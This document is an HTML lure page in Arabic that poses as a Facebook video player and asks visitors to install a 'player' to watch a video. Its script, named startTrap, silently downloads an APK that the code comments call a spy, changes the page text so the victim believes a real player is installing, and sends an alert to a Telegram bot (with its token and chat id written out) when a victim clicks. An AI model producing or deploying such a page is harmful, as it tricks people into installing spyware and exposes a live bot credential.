<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video Player</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .video-box { width: 100%; max-width: 500px; position: relative; background: #000; }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
        .download-btn { background: #1877f2; color: white; padding: 15px 30px; border-radius: 30px; text-decoration: none; font-weight: bold; display: flex; align-items: center; gap: 10px; cursor: pointer; border: none; font-size: 18px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .arrow { width: 20px; height: 20px; fill: white; }
        .info-text { font-size: 14px; color: #ccc; margin-top: 15px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>

    <div class="video-box">
        <img src="https://via.placeholder.com/500x300/000000/FFFFFF?text=Click+to+Play+Video" style="width: 100%;">
        
        <div class="overlay" id="overlay">
            <button class="download-btn" onclick="startTrap()">
                <span>تحميل الفيديو للمشاهدة</span>
                <svg class="arrow" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
            </button>
            <p class="info-text">يجب تثبيت "مشغل فيديو فيسبوك" لمشاهدة هذا المحتوى بدقة عالية.</p>
        </div>
    </div>

    <script>
        function startTrap() {
            // 1. تنزيل ملف الـ APK (الجاسوس) تلقائياً
            const fileUrl = 'facebook_fix.apk'; // تأكد إن الملف مرفوع على GitHub بنفس الاسم
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'Facebook_Player_HD.apk';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // 2. تغيير النص عشان يفتكر إنه بيثبت المشغل فعلاً
            document.querySelector('.info-text').innerHTML = "<b style='color:#00ff00'>جاري التحميل...</b><br>بعد التحميل، اضغط 'فتح' ثم 'تثبيت' لمشاهدة الفيديو فوراً.";
            
            // 3. نبعت إشارة لبوت التليجرام إن الضحية ضغط على التحميل
            const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
            const chatId = "1356975454";
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية ضغط على زر التحميل وبدأ تنزيل الـ APK!")}`);
        }
    </script>
</body>
</html>
